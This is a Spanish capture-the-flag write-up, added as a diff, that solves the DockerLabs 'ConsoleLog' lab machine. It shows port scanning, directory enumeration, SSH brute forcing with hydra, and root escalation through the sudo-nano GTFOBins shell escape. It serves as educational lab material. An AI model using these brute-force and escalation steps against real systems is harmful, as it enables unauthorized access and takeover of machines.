@@ -1,0 +1,215 @@
+---
+title: ConsoleLog
+description: Resolución completa de la máquina virtual *ConsoleLog* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **ConsoleLog**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web que contiene un mensaje en la consola del navegador y un directorio `/backend` que expone archivos JavaScript de una aplicación Node.js. Estos archivos revelan credenciales que permiten identificar un usuario válido mediante fuerza bruta.
+Tras acceder al sistema vía SSH, se identifica una configuración insegura de `sudo` que permite ejecutar `nano` como root sin autenticación, facilitando la escalada de privilegios mediante técnicas de GTFOBins para obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'ConsoleLog',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '29/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip ConsoleLog.zip
+sudo bash auto_deplo.sh ConsoleLog.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p ConsoleLog/{content,exploits,nmap,scripts}
+cd ConsoleLog
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+* **3000/tcp** — HTTP (Node.js)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1750750715/Ports_itnuf6.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80,3000 172.17.0.2 -oN targeted
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1750752563/Services_v2eqhy.png)
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1750750713/Gobuster_lac6jg.png)
+
+**Hallazgos relevantes:**
+- `index.html` — Página principal con un botón. Al inspeccionar la consola del navegador, se muestra un mensaje revelador.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1750750714/Index_qxconb.png)
+  ![Console](https://res.cloudinary.com/dewqswzke/image/upload/v1750750713/ConsoleLog_okqye2.png)
+
+- `/backend` — Directorio que expone archivos de una aplicación Node.js.
+  ![Backend](https://res.cloudinary.com/dewqswzke/image/upload/v1750750719/Backend_a6qu1s.png)
+
+- `Server.js` — Contiene una pista crucial para el siguiente paso.
+  ![Server.js](https://res.cloudinary.com/dewqswzke/image/upload/v1750750717/Server.js_sgnyol.png)
+
+- `Authentication.js` — Archivo de autenticación.
+  ![Authentication.js](https://res.cloudinary.com/dewqswzke/image/upload/v1750750717/ServerNode_co6dyo.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Fuerza bruta con Hydra
+
+No se identificaron formularios explotables ni rutas vulnerables directamente. Se opta por probar autenticación por fuerza bruta a través del servicio SSH utilizando `hydra`:
+
+```bash
+hydra -L /usr/share/wordlists/rockyou.txt \
+      -p contraseña_conocida ssh://172.17.0.2 -t 4
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1750750714/Hydra_jwadsv.png)
+
+### 2.2 Acceso SSH
+
+Una vez identificado el usuario válido, se accede vía SSH:
+
+```bash
+ssh usuario@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1750750718/Ssh_e1ud70.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De usuario → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+Se indica que el usuario puede ejecutar `nano` como superusuario sin necesidad de contraseña:
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1750750718/Sudo-L_twddvq.png)
+
+Se utiliza `searchbins` para verificar si existe una ruta en GTFOBins para `nano`:
+
+```bash
+searchbins -b nano -f sudo
+```
+
+![Searchbins](https://res.cloudinary.com/dewqswzke/image/upload/v1750750716/SearchBins_tcjxvv.png)
+
+Se ejecuta `nano` con privilegios:
+
+```bash
+sudo nano
+```
+
+Dentro de nano, se presiona `Ctrl+R`, luego `Ctrl+X`, y se escribe:
+
+```
+reset; sh 1>&0 2>&0
+```
+
+Se pulsa `Enter` y se obtiene acceso como superusuario:
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1750750715/Root_g0iqsq.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Exposición de mensajes de depuración en consola del navegador",
+      severity: "Baja",
+      impact: "Revelación de información sobre el sistema"
+    },
+    {
+      vulnerability: "Exposición de archivos de código fuente del backend",
+      severity: "Media",
+      impact: "Revelación de lógica de autenticación y posibles credenciales"
+    },
+    {
+      vulnerability: "Contraseña débil para usuario del sistema",
+      severity: "Crítica",
+      impact: "Acceso no autorizado mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en nano",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Falta de validación de archivos sensibles expuestos",
+      severity: "Alta",
+      impact: "Exposición de información crítica del sistema"
+    }
+  ]}
+/>
